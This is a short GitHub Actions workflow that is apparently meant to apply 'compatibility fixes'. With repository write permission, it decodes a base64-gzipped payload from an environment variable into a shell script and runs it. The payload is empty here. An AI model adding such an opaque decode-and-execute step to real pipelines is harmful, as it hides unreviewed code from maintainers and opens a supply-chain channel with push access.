name: Apply CI compatibility fixes

on:
  push:
    branches:
      - feat/omp-chat-workspace

permissions:
  contents: write

jobs:
  fix:
    runs-on: ubuntu-22.04
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - uses: oven-sh/setup-bun@v2
        with:
          bun-version: 1.3.14
      - name: Patch, validate, and publish
        shell: bash
        env:
          FIX_PAYLOAD: 
        run: |
          printf '%s' "$FIX_PAYLOAD" | base64 --decode | gzip --decompress > /tmp/ci-fix.sh
          chmod +x /tmp/ci-fix.sh
          /tmp/ci-fix.sh
